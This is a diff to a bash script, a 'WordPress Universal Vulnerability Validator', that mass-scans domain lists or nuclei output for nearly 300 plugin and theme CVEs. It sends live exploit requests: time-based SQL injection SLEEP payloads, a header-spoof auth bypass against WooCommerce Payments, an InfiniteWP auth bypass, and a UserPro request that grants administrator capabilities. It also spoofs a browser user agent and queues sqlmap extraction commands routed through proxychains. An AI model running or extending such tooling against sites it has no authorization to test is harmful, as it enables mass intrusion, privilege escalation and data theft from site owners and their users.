@@ -1,7 +1,7 @@
 #!/bin/bash
 # ============================================================
 # WordPress Universal Vulnerability Validator
-# 194 CVEs: SQLi, Auth Bypass, PrivEsc
+# 292 templates: 194 CVEs + 98 version-check (SQLi, Auth Bypass, PrivEsc)
 # Usage: ./validate_wp_sqli.sh [-o DIR] [--csv] [-j N|--jobs N] <url|domains.txt|nuclei_out.txt>
 # ============================================================
 set -uo pipefail
@@ -16,6 +16,7 @@ SLEEP_SEC=6
 THRESHOLD=5
 TIMEOUT=12
 CSV_MODE=0
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
 OUTDIR="/tmp/wp_validate_$(date +%Y%m%d_%H%M%S)"
 
 JOBS=1
@@ -56,27 +57,75 @@ add_sqlmap() { flock -x "$SQLMAP_FILE" -c "echo '$1' >> '$SQLMAP_FILE'"; }
 time_check() {
     local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" SL="${4:-$SLEEP_SEC}"
     local START; START=$(date +%s)
-    curl -sk -o /dev/null -m $((SL+TIMEOUT)) -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
+    curl -sk -A "$UA" -o /dev/null -m $((SL+TIMEOUT)) -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
     echo $(( $(date +%s) - START ))
 }
 
 time_check_h() {
     local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" HDR="${4:-}" SL="${5:-$SLEEP_SEC}"
     local START; START=$(date +%s)
-    curl -sk -o /dev/null -m $((SL+TIMEOUT)) -H "$HDR" -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
+    curl -sk -A "$UA" -o /dev/null -m $((SL+TIMEOUT)) -H "$HDR" -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
     echo $(( $(date +%s) - START ))
 }
 
 http_probe() {
     local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" CT="${4:-application/x-www-form-urlencoded}"
-    curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" -H "Content-Type: ${CT}" -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
+    curl -sk -A "$UA" -L -m "$TIMEOUT" -w "\n%{http_code}" -H "Content-Type: ${CT}" -X "$METHOD" ${DATA:+--data "$DATA"} "$URL" 2>/dev/null || true
 }
 
 plugin_check() {
     local BASE_URL="$1" SLUG="$2"
     [ -z "$SLUG" ] && return 0
-    local HTTP; HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m "$TIMEOUT" "${BASE_URL}/wp-content/plugins/${SLUG}/readme.txt" 2>/dev/null || echo 000)
+    # Skip readme.txt check when nuclei already confirmed plugin presence
+    [ "${NUCLEI_TRUST:-0}" = "1" ] && return 0
+    local HTTP; HTTP=$(curl -sk -A "$UA" -o /dev/null -w "%{http_code}" -m "$TIMEOUT" "${BASE_URL}/wp-content/plugins/${SLUG}/readme.txt" 2>/dev/null || echo 000)
     [ "$HTTP" = "200" ]
+}
+
+# Replay exact nuclei URL; returns 0 if confirmed (writes result), 1 if not
+# Strategy:
+#   SLEEP in URL  → GET time-based replay → CONFIRMED or discard
+#   Query string  → GET response replay   → LIKELY if 200 (nuclei checked this path)
+#   Generic URL   → trust nuclei directly → LIKELY (POST-based or plugin-presence CVE)
+replay_nuclei_url() {
+    local NUCLEI_URL="$1" DOMAIN="$2" CVE="$3"
+    [ -z "$NUCLEI_URL" ] && return 1
+    # Strip any nuclei match metadata suffix (e.g., ' [""]' appended by nuclei)
+    [[ "$NUCLEI_URL" =~ (https?://[^[:space:]]+) ]] && NUCLEI_URL="${BASH_REMATCH[1]}" || return 1
+    echo -e "\n${YELLOW}[${CVE}] nuclei-replay: ${NUCLEI_URL:0:90}${NC}"
+
+    # 1. Time-based: URL has SLEEP payload embedded (GET SQLi)
+    if [[ "$NUCLEI_URL" =~ [Ss][Ll][Ee][Ee][Pp][\(%28]|%53%4[Cc]%45%45%50|SELECT.*SLEEP ]]; then
+        local START DUR
+        START=$(date +%s)
+        curl -sk -A "$UA" -o /dev/null -m $((SLEEP_SEC+TIMEOUT)) "$NUCLEI_URL" 2>/dev/null || true
+        DUR=$(( $(date +%s) - START ))
+        if [ "$DUR" -ge "$THRESHOLD" ]; then
+            log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "nuclei-replay GET sleep=${DUR}s" "sqli"
+            add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u '${NUCLEI_URL}' --technique=T --dbms=MySQL --batch"
+            return 0
+        fi
+        echo -e "${GREEN}  nuclei-replay: no delay (${DUR}s) — site down or FP${NC}"
+        return 1
+    fi
+
+    # 2. URL has a meaningful query string → verify site is alive, then let custom check run
+    if [[ "$NUCLEI_URL" =~ \?.{3,} ]]; then
+        local HTTP
+        HTTP=$(curl -skL -A "$UA" -o /dev/null -w "%{http_code}" -m "$TIMEOUT" "$NUCLEI_URL" 2>/dev/null || echo 000)
+        if [[ "$HTTP" =~ ^2 ]]; then
+            # Site alive → trust nuclei, let custom check run for deeper result
+            NUCLEI_TRUST=1
+            return 1
+        fi
+        echo -e "${GREEN}  nuclei-replay: HTTP ${HTTP} — unreachable${NC}"
+        return 1
+    fi
+
+    # 3. Generic/POST-based URL (admin-ajax.php, wp-json endpoint, bare domain)
+    #    Nuclei confirmed plugin presence via POST — skip readme check, run custom exploit check
+    NUCLEI_TRUST=1
+    return 1  # let validate_domain run the custom check with plugin_check bypassed
 }
 
 # Generic time-based GET (payload already in URL)
@@ -137,6 +186,43 @@ check_plugin_only() {
         echo -e "${RED}  Plugin not found${NC}"; return
     fi
     log_vuln "$DOMAIN" "$CVE" "PLUGIN_PRESENT" "${PLUGIN} installed — requires auth: use nuclei -t wp_sqli/${CVE}.yaml" "sqli"
+}
+
+# Generic version-compare handler (for topscoder-style templates)
+# Fetches readme.txt, extracts "Stable tag:", compares to MAX_VER with version_compare logic
+version_gt() {
+    [ "$(printf '%s\n' "$1" "$2" | sort -V | tail -1)" = "$1" ] && [ "$1" != "$2" ]
+}
+version_lte() { ! version_gt "$1" "$2"; }
+
+check_version_plugin() {
+    local BASE_URL="$1" DOMAIN="$2" CVE="$3" SLUG="$4" MAX_VER="$5"
+    echo -e "\n${YELLOW}[${CVE}] plugin=${SLUG} | version-check (<= ${MAX_VER})${NC}"
+    if [ -n "$SLUG" ] && ! plugin_check "$BASE_URL" "$SLUG"; then
+        echo -e "${RED}  Plugin not found${NC}"; return
+    fi
+    local VER; VER=$(curl -sk -A "$UA" -m "$TIMEOUT" "${BASE_URL}/wp-content/plugins/${SLUG}/readme.txt" 2>/dev/null | grep -oP "(?i)Stable tag:\s*\K[\d.]+" | head -1)
+    if [ -z "$VER" ]; then log_safe "$DOMAIN" "$CVE" "version undetectable"; return; fi
+    if version_lte "$VER" "$MAX_VER"; then
+        log_vuln "$DOMAIN" "$CVE" "VERSION_MATCH" "v${VER} <= ${MAX_VER}" "sqli"
+    else
+        log_safe "$DOMAIN" "$CVE" "v${VER} > ${MAX_VER} (patched)"
+    fi
+}
+
+check_version_theme() {
+    local BASE_URL="$1" DOMAIN="$2" CVE="$3" SLUG="$4" MAX_VER="$5"
+    echo -e "\n${YELLOW}[${CVE}] theme=${SLUG} | version-check (<= ${MAX_VER})${NC}"
+    local VER; VER=$(curl -sk -A "$UA" -m "$TIMEOUT" "${BASE_URL}/wp-content/themes/${SLUG}/readme.txt" 2>/dev/null | grep -oP "(?i)Stable tag:\s*\K[\d.]+" | head -1)
+    if [ -z "$VER" ]; then
+        VER=$(curl -sk -A "$UA" -m "$TIMEOUT" "${BASE_URL}/wp-content/themes/${SLUG}/style.css" 2>/dev/null | grep -oP "(?i)Version:\s*\K[\d.]+" | head -1)
+    fi
+    if [ -z "$VER" ]; then log_safe "$DOMAIN" "$CVE" "version undetectable (theme=${SLUG})"; return; fi
+    if version_lte "$VER" "$MAX_VER"; then
+        log_vuln "$DOMAIN" "$CVE" "VERSION_MATCH" "theme v${VER} <= ${MAX_VER}" "sqli"
+    else
+        log_safe "$DOMAIN" "$CVE" "theme v${VER} > ${MAX_VER} (patched)"
+    fi
 }
 
 _check_CVE_2015_2196() { check_time_get "$1" "$2" 'CVE-2015-2196' 'spider-calendar' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json'; }
@@ -334,6 +420,107 @@ _check_wp_smart_manager_sqli() { check_plugin_only "$1" "$2" 'wp-smart-manager-s
 _check_wp_statistics_sqli() { check_time_get "$1" "$2" 'wp-statistics-sqli' 'wp-statistics' '/wp-content/plugins/wp-statistics/readme.txt'; }
 _check_zero_spam_sql_injection() { check_time_get "$1" "$2" 'zero-spam-sql-injection' '' '/'; }
 
+# --- Auto-generated version-check handlers for 98 new templates ---
+_check_cve_2021_24400() { check_version_plugin "$1" "$2" 'CVE-2021-24400' 'wp-display-users' '2.0.0'; }
+_check_cve_2021_24402() { check_version_plugin "$1" "$2" 'CVE-2021-24402' 'wp-icommerce' '1.1.1'; }
+_check_cve_2021_24457() { check_version_plugin "$1" "$2" 'CVE-2021-24457' 'portfolio-responsive-gallery' '1.1.7'; }
+_check_cve_2021_24575() { check_version_plugin "$1" "$2" 'CVE-2021-24575' 'wpschoolpress' '2.1.10'; }
+_check_cve_2021_24662() { check_version_plugin "$1" "$2" 'CVE-2021-24662' 'game-server-status' '1.0'; }
+_check_cve_2021_24741() { check_version_plugin "$1" "$2" 'CVE-2021-24741' 'supportboard' '3.3.3'; }
+_check_cve_2021_24858() { check_version_plugin "$1" "$2" 'CVE-2021-24858' 'wp-cookie-user-info' '1.0.9'; }
+_check_cve_2021_24863() { check_version_plugin "$1" "$2" 'CVE-2021-24863' 'stopbadbots' '6.67'; }
+_check_cve_2021_24952() { check_version_plugin "$1" "$2" 'CVE-2021-24952' 'enhanced-e-commerce-for-woocommerce-store' '4.6.2'; }
+_check_cve_2021_25023() { check_version_plugin "$1" "$2" 'CVE-2021-25023' 'speed-booster-pack' '4.3.3'; }
+_check_cve_2022_0478() { check_version_plugin "$1" "$2" 'CVE-2022-0478' 'mage-eventpress' '3.5.8'; }
+_check_cve_2022_0657() { check_version_plugin "$1" "$2" 'CVE-2022-0657' '5-stars-rating-funnel' '1.2.53'; }
+_check_cve_2022_23911() { check_version_plugin "$1" "$2" 'CVE-2022-23911' 'ap-custom-testimonial' '1.4.7'; }
+_check_cve_2022_2593() { check_version_plugin "$1" "$2" 'CVE-2022-2593' 'better-search-replace' '1.4'; }
+_check_cve_2022_29410() { check_version_plugin "$1" "$2" 'CVE-2022-29410' 'hermit' '3.1.6'; }
+_check_cve_2022_3141() { check_version_plugin "$1" "$2" 'CVE-2022-3141' 'translatepress-multilingual' '2.3.2'; }
+_check_cve_2022_3494() { check_version_plugin "$1" "$2" 'CVE-2022-3494' 'complianz-gdpr' '6.3.3'; }
+_check_cve_2022_3720() { check_version_plugin "$1" "$2" 'CVE-2022-3720' 'event-monster' '1.2.0'; }
+_check_cve_2022_4351() { check_version_plugin "$1" "$2" 'CVE-2022-4351' 'qe-seo-handyman' '1.0'; }
+_check_cve_2022_4359() { check_version_plugin "$1" "$2" 'CVE-2022-4359' 'wp-rss-by-publishers' '0.1'; }
+_check_cve_2022_4370() { check_version_plugin "$1" "$2" 'CVE-2022-4370' 'multimedial-images' '1.0b'; }
+_check_cve_2022_45373() { check_version_plugin "$1" "$2" 'CVE-2022-45373' 'wp-slimstat' '5.0.4'; }
+_check_cve_2022_4546() { check_version_plugin "$1" "$2" 'CVE-2022-4546' 'mapwiz' '1.0.1'; }
+_check_cve_2022_45820() { check_version_plugin "$1" "$2" 'CVE-2022-45820' 'learnpress' '4.1.7.3.2'; }
+_check_cve_2022_47426() { check_version_plugin "$1" "$2" 'CVE-2022-47426' 'neshan-maps' '1.1.4'; }
+_check_cve_2023_0262() { check_version_plugin "$1" "$2" 'CVE-2023-0262' 'wp-airbnb-review-slider' '3.2'; }
+_check_cve_2023_0277() { check_version_plugin "$1" "$2" 'CVE-2023-0277' 'wc-fields-factory' '4.1.5'; }
+_check_cve_2023_0487() { check_plugin_only "$1" "$2" 'CVE-2023-0487' 'mystickyelements'; }
+_check_cve_2023_26325() { check_version_plugin "$1" "$2" 'CVE-2023-26325' 'reviewx' '1.6.8'; }
+_check_cve_2023_28659() { check_version_plugin "$1" "$2" 'CVE-2023-28659' 'waiting' '0.6.2'; }
+_check_cve_2023_29432() { check_version_theme "$1" "$2" 'CVE-2023-29432' 'houzez' '2.8.3'; }
+_check_cve_2023_3416() { check_version_plugin "$1" "$2" 'CVE-2023-3416' 'td-subscription' '1.4.4'; }
+_check_cve_2023_34179() { check_version_plugin "$1" "$2" 'CVE-2023-34179' 'groundhogg' '2.7.11'; }
+_check_cve_2023_3435() { check_version_plugin "$1" "$2" 'CVE-2023-3435' 'user-activity-log' '1.6.4'; }
+_check_cve_2023_34383() { check_version_plugin "$1" "$2" 'CVE-2023-34383' 'wedevs-project-manager' '2.6.0'; }
+_check_cve_2023_35879() { check_version_plugin "$1" "$2" 'CVE-2023-35879' 'woocommerce-product-vendors' '2.1.78'; }
+_check_cve_2023_40010() { check_version_plugin "$1" "$2" 'CVE-2023-40010' 'woocommerce-products-filter' '1.3.4.2'; }
+_check_cve_2023_45657() { check_version_theme "$1" "$2" 'CVE-2023-45657' 'nexter' '2.0.3'; }
+_check_cve_2023_49752() { check_version_theme "$1" "$2" 'CVE-2023-49752' 'adifier-system' '3.1.4'; }
+_check_cve_2023_50851() { check_version_plugin "$1" "$2" 'CVE-2023-50851' 'simply-schedule-appointments' '1.6.6.1'; }
+_check_cve_2023_50853() { check_version_plugin "$1" "$2" 'CVE-2023-50853' 'advanced-form-integration' '1.76.0'; }
+_check_cve_2023_50855() { check_version_plugin "$1" "$2" 'CVE-2023-50855' 'pre-party-browser-hints' '1.8.19'; }
+_check_cve_2023_5108() { check_version_plugin "$1" "$2" 'CVE-2023-5108' 'easy-newsletter-signups' '1.0.4'; }
+_check_cve_2023_52135() { check_version_plugin "$1" "$2" 'CVE-2023-52135' 'ws-form' '1.9.171'; }
+_check_cve_2024_0709() { check_version_plugin "$1" "$2" 'CVE-2024-0709' 'cryptocurrency-price-ticker-widget' '2.0,'; }
+_check_cve_2024_0956() { check_version_plugin "$1" "$2" 'CVE-2024-0956' 'erp' '1.13.0'; }
+_check_cve_2024_10499() { check_version_plugin "$1" "$2" 'CVE-2024-10499' 'ai-engine' '2.6.3'; }
+_check_cve_2024_10570() { check_version_plugin "$1" "$2" 'CVE-2024-10570' 'security-malware-firewall' '2.145'; }
+_check_cve_2024_10862() { check_version_plugin "$1" "$2" 'CVE-2024-10862' 'nex-forms-express-wp-form-builder' '8.7.13'; }
+_check_cve_2024_11912() { check_version_theme "$1" "$2" 'CVE-2024-11912' 'traveler' '3.1.6'; }
+_check_cve_2024_1207() { check_version_plugin "$1" "$2" 'CVE-2024-1207' 'booking' '9.9'; }
+_check_cve_2024_12157() { check_version_plugin "$1" "$2" 'CVE-2024-12157' 'ultimate-popup-creator' '3.2.6'; }
+_check_cve_2024_13184() { check_version_plugin "$1" "$2" 'CVE-2024-13184' 'wpextended' '3.0.12'; }
+_check_cve_2024_13475() { check_version_plugin "$1" "$2" 'CVE-2024-13475' 'small-package-quotes-ups-edition' '4.5.16'; }
+_check_cve_2024_13479() { check_version_plugin "$1" "$2" 'CVE-2024-13479' 'ltl-freight-quotes-sefl-edition' '3.2.4'; }
+_check_cve_2024_13481() { check_version_plugin "$1" "$2" 'CVE-2024-13481' 'ltl-freight-quotes-rl-edition' '3.3.4'; }
+_check_cve_2024_13483() { check_version_plugin "$1" "$2" 'CVE-2024-13483' 'ltl-freight-quotes-saia-edition' '2.2.10'; }
+_check_cve_2024_13712() { check_version_plugin "$1" "$2" 'CVE-2024-13712' 'pollin' '1.01.1'; }
+_check_cve_2024_1990() { check_version_plugin "$1" "$2" 'CVE-2024-1990' 'custom-registration-form-builder-with-submission-manager' '5.3.1.0'; }
+_check_cve_2024_2386() { check_version_plugin "$1" "$2" 'CVE-2024-2386' 'wp-google-map-plugin' '4.6.1'; }
+_check_cve_2024_30242() { check_version_plugin "$1" "$2" 'CVE-2024-30242' 'contact-form-to-any-api' '1.1.8'; }
+_check_cve_2024_31356() { check_version_plugin "$1" "$2" 'CVE-2024-31356' 'user-activity-log' '1.8'; }
+_check_cve_2024_32134() { check_version_plugin "$1" "$2" 'CVE-2024-32134' 'forms-to-zapier' '1.1.12'; }
+_check_cve_2024_33559() { check_version_theme "$1" "$2" 'CVE-2024-33559' 'xstore' '9.3.8'; }
+_check_cve_2024_3820() { check_version_plugin "$1" "$2" 'CVE-2024-3820' 'wpdatatables' '6.3.1'; }
+_check_cve_2024_38708() { check_version_plugin "$1" "$2" 'CVE-2024-38708' 'barcode-scanner-lite-pos-to-manage-products-inventory-and-orders' '1.6.1'; }
+_check_cve_2024_4145() { check_version_plugin "$1" "$2" 'CVE-2024-4145' 'search-and-replace' '3.2.1'; }
+_check_cve_2024_49621() { check_version_plugin "$1" "$2" 'CVE-2024-49621' 'apa-register-newsletter-form' '1.0.0'; }
+_check_cve_2024_49655() { check_version_plugin "$1" "$2" 'CVE-2024-49655' 'arprice' '4.1.3'; }
+_check_cve_2024_54280() { check_version_plugin "$1" "$2" 'CVE-2024-54280' 'wpbookit' '1.6.0'; }
+_check_cve_2024_56039() { check_version_plugin "$1" "$2" 'CVE-2024-56039' 'vibebp' '1.9.9.7.7'; }
+_check_cve_2025_12166() { check_version_plugin "$1" "$2" 'CVE-2025-12166' 'simply-schedule-appointments' '1.6.9.9'; }
+_check_cve_2025_13126() { check_version_plugin "$1" "$2" 'CVE-2025-13126' 'wpforo' '2.4.12'; }
+_check_cve_2025_2317() { check_version_plugin "$1" "$2" 'CVE-2025-2317' 'woo-product-filter' '2.7.9'; }
+_check_cve_2025_23993() { check_version_plugin "$1" "$2" 'CVE-2025-23993' 'felan-framework' '1.1.3'; }
+_check_cve_2025_24759() { check_version_plugin "$1" "$2" 'CVE-2025-24759' 'wp-businessdirectory' '3.1.4'; }
+_check_cve_2025_26943() { check_version_plugin "$1" "$2" 'CVE-2025-26943' 'easy-quotes' '1.2.2'; }
+_check_cve_2025_31056() { check_plugin_only "$1" "$2" 'CVE-2025-31056' ''; }
+_check_cve_2025_31534() { check_version_plugin "$1" "$2" 'CVE-2025-31534' 'shopper' '3.2.5'; }
+_check_cve_2025_31553() { check_version_plugin "$1" "$2" 'CVE-2025-31553' 'webd-woocommerce-advanced-reporting-statistics' '4.1.1'; }
+_check_cve_2025_31599() { check_version_plugin "$1" "$2" 'CVE-2025-31599' 'sync-wc-google' '8.6'; }
+_check_cve_2025_32547() { check_version_plugin "$1" "$2" 'CVE-2025-32547' 'all-push-notification' '1.5.3'; }
+_check_cve_2025_52773() { check_version_plugin "$1" "$2" 'CVE-2025-52773' 'hcv4-payment-gateway' '1.5.11'; }
+_check_cve_2025_52829() { check_version_plugin "$1" "$2" 'CVE-2025-52829' 'directiq-wp' '2.0'; }
+_check_cve_2025_52830() { check_version_plugin "$1" "$2" 'CVE-2025-52830' 'bsecure' '1.7.9'; }
+_check_cve_2025_69338() { check_version_plugin "$1" "$2" 'CVE-2025-69338' 'riode-core' '1.6.26'; }
+_check_cve_2025_69366() { check_version_plugin "$1" "$2" 'CVE-2025-69366' 'emerce-core' '1.8'; }
+_check_cve_2025_9200() { check_version_plugin "$1" "$2" 'CVE-2025-9200' 'yournewsapp' '0.8.8.8'; }
+_check_cve_2025_9807() { check_version_plugin "$1" "$2" 'CVE-2025-9807' 'the-events-calendar' '6.15.1'; }
+_check_cve_2026_22484() { check_version_plugin "$1" "$2" 'CVE-2026-22484' 'lisfinity-core' '1.5.0'; }
+_check_cve_2026_2416() { check_version_plugin "$1" "$2" 'CVE-2026-2416' 'geo-mashup' '1.13.17'; }
+_check_cve_2026_24959() { check_version_plugin "$1" "$2" 'CVE-2026-24959' 'js-support-ticket' '3.0.1'; }
+_check_leaguemanager_sqli() { check_version_plugin "$1" "$2" 'leaguemanager-sqli' 'leaguemanager' '3.9.11'; }
+_check_mapsvg_sqli() { check_time_get "$1" "$2" 'mapsvg-sqli' 'mapsvg' '/wp-json/mapsvg/v1/maps/2?id=1%27%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)--+'; }
+_check_q_and_a_plugin_sqli() { check_version_plugin "$1" "$2" 'q-and-a-plugin-sqli' 'q-and-a' '1.0.6.2'; }
+_check_rsvpmaker_sqli() { check_version_plugin "$1" "$2" 'rsvpmaker-sqli' 'rsvpmaker' '7.8.2'; }
+_check_wp_advanced_search_sqli() { check_version_plugin "$1" "$2" 'wp-advanced-search-sqli' 'wp-advanced-search' '3.3.6'; }
+_check_zero_spam_sqli() { check_version_plugin "$1" "$2" 'zero-spam-sqli' 'zero-spam' '2.2.0'; }
+
+
 # ============================================================
 # Overrides for auth-bypass / privesc CVEs (specific exploits)
 # ============================================================
@@ -367,11 +554,19 @@ _check_CVE_2024_10924() {
 }
 _check_CVE_2023_28121() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-28121"
-    echo -e "\n${YELLOW}[${CVE}] WooCommerce Payments — X-WCPAY header${NC}"
+    echo -e "\n${YELLOW}[${CVE}] WooCommerce Payments — X-WCPAY header spoof${NC}"
     if ! plugin_check "$BASE_URL" "woocommerce-payments"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
-    local RESP; RESP=$(curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" -H "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" "${BASE_URL}/wp-json/wp/v2/users/1" 2>/dev/null||true)
-    local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
-    if [ "$STATUS" = "200" ] && echo "$BODY"|grep -q '"email"'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin email via header spoof" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "header ignored or email hidden"; fi
+    local RESP; RESP=$(curl -sk -A "$UA" -L -m "$TIMEOUT" -w "\n%{http_code}" \
+        -H "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
+        "${BASE_URL}/wp-json/wp/v2/users/1" 2>/dev/null||true)
+    local BODY; BODY=$(echo "$RESP"|head -n -1)
+    local STATUS; STATUS=$(echo "$RESP"|tail -1)
+    # nuclei matcher (OR): status==200 AND ("id":1 OR "email" OR "roles")
+    if [ "$STATUS" = "200" ] && echo "$BODY" | grep -qE '"id"[[:space:]]*:[[:space:]]*1|"email"|"roles"'; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "user data via header spoof (status $STATUS)" "auth-bypass"
+    else
+        log_safe "$DOMAIN" "$CVE" "header ignored (status $STATUS)"
+    fi
 }
 _check_CVE_2024_28000() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-28000"
@@ -385,7 +580,19 @@ _check_CVE_2020_8772() {
     echo -e "\n${YELLOW}[${CVE}] InfiniteWP — base64 auth bypass${NC}"
     if ! plugin_check "$BASE_URL" "iwp-client"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/" POST 'iwp_action=add_site&serialized_option=eyJpd3BfYWN0aW9uIjoiYWRkX3NpdGUiLCJwYXJhbXMiOnsidXNlcm5hbWUiOiJhZG1pbiJ9fQ==')
-    if echo "$RESP"|head -n -1|grep -qiE '"success".*true|logged_in'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "bypass" "auth-bypass"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
+    local BODY; BODY=$(echo "$RESP" | head -n -1)
+    local STATUS; STATUS=$(echo "$RESP" | tail -1)
+    # nuclei matcher (OR):
+    # 1. body has "success" | "logged_in" | "administrator"
+    # 2. status==200 && !invalid && (user_login|user_email|cookie)
+    if echo "$BODY" | grep -qiE '"success"|logged_in|"administrator"'; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "IWP bypass (matcher 1)" "auth-bypass"
+    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "invalid" && \
+         echo "$BODY" | grep -qiE 'user_login|user_email|cookie'; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "IWP bypass (matcher 2: user data)" "auth-bypass"
+    else
+        log_safe "$DOMAIN" "$CVE" "not vulnerable"
+    fi
 }
 _check_CVE_2023_3076() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-3076"
@@ -397,10 +604,21 @@ _check_CVE_2023_3076() {
 }
 _check_CVE_2023_6009() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2023-6009"
-    echo -e "\n${YELLOW}[${CVE}] UserPro — profile update privesc${NC}"
+    echo -e "\n${YELLOW}[${CVE}] UserPro <= 5.1.4 — profile update privesc (no auth/CSRF check)${NC}"
     if ! plugin_check "$BASE_URL" "userpro"; then echo -e "${RED}  Plugin not found${NC}"; return; fi
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" POST 'action=userpro_save_profile&user_id=1&wp_capabilities[administrator]=1&nonce=probe')
-    if echo "$RESP"|head -n -1|grep -qiE '"success".*true|saved'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "profile update no auth" "privesc"; else log_safe "$DOMAIN" "$CVE" "not vulnerable"; fi
+    local BODY; BODY=$(echo "$RESP" | head -n -1)
+    local STATUS; STATUS=$(echo "$RESP" | tail -1)
+    # nuclei matcher (OR):
+    # 1. body has "success":true | "saved" | "updated"
+    # 2. status==200 && !permission && !not allowed  (action executed = no auth check)
+    if echo "$BODY" | grep -qiE '"success".*true|"saved"|"updated"'; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "profile update accepted (success)" "privesc"
+    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qiE 'permission|not allowed|-1'; then
+        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "action executed without auth check (200, no error)" "privesc"
+    else
+        log_safe "$DOMAIN" "$CVE" "not vulnerable (${STATUS})"
+    fi
 }
 _check_CVE_2024_27956() {
     local BASE_URL="$1" DOMAIN="$2"; local CVE="CVE-2024-27956"
@@ -483,15 +701,24 @@ _check_CVE_2023_2437() {
 }
 
 validate_domain() {
-    local INPUT_URL="$1" CVE_HINT="${2:-}"
-    local BASE_URL; BASE_URL=$(echo "$INPUT_URL"|grep -oP 'https?://[^/\s]+')
-    local DOMAIN; DOMAIN=$(echo "$BASE_URL"|sed 's|https\?://||')
+    local INPUT_URL="$1" CVE_HINT="${2:-}" NUCLEI_URL="${3:-}"
+    local BASE_URL DOMAIN
+    [[ "$INPUT_URL" =~ ^(https?://[^/?#[:space:]]+) ]] && BASE_URL="${BASH_REMATCH[1]}" || BASE_URL="$INPUT_URL"
+    [[ "$BASE_URL" =~ ^https?://(.+)$ ]] && DOMAIN="${BASH_REMATCH[1]}" || DOMAIN="$BASE_URL"
     [ -z "$DOMAIN" ] && return
+    NUCLEI_TRUST=0
     echo -e "\n${BOLD}${CYAN}============================================${NC}"
     echo -e "${BOLD}  Target: ${DOMAIN}${NC}"
     [ -n "$CVE_HINT" ] && echo -e "${BOLD}  CVE: ${CVE_HINT}${NC}"
     echo -e "${CYAN}============================================${NC}"
     if [ -n "$CVE_HINT" ]; then
+        # First: replay the exact nuclei URL
+        # For GET+SLEEP URLs → CONFIRMED directly
+        # For query string URLs → LIKELY if HTTP 200
+        # For generic POST URLs → sets NUCLEI_TRUST=1, returns 1, custom check runs below
+        if [ -n "$NUCLEI_URL" ] && replay_nuclei_url "$NUCLEI_URL" "$DOMAIN" "$CVE_HINT"; then
+            return
+        fi
         case "$CVE_HINT" in
         *CVE-2015-2196*) _check_CVE_2015_2196 "$BASE_URL" "$DOMAIN" ;;
         *CVE-2015-4062*) _check_CVE_2015_4062 "$BASE_URL" "$DOMAIN" ;;
@@ -687,6 +914,104 @@ validate_domain() {
         *wp-smart-manager-sqli*) _check_wp_smart_manager_sqli "$BASE_URL" "$DOMAIN" ;;
         *wp-statistics-sqli*) _check_wp_statistics_sqli "$BASE_URL" "$DOMAIN" ;;
         *zero-spam-sql-injection*) _check_zero_spam_sql_injection "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24400*) _check_cve_2021_24400 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24402*) _check_cve_2021_24402 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24457*) _check_cve_2021_24457 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24575*) _check_cve_2021_24575 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24662*) _check_cve_2021_24662 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24741*) _check_cve_2021_24741 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24858*) _check_cve_2021_24858 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24863*) _check_cve_2021_24863 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-24952*) _check_cve_2021_24952 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2021-25023*) _check_cve_2021_25023 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-0478*) _check_cve_2022_0478 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-0657*) _check_cve_2022_0657 "$BASE_URL" "$DOMAIN" ;;
+        *CVE-2022-23911*) _check_cve_2022_23911 "$BASE_URL" "$DOMAIN" ;;
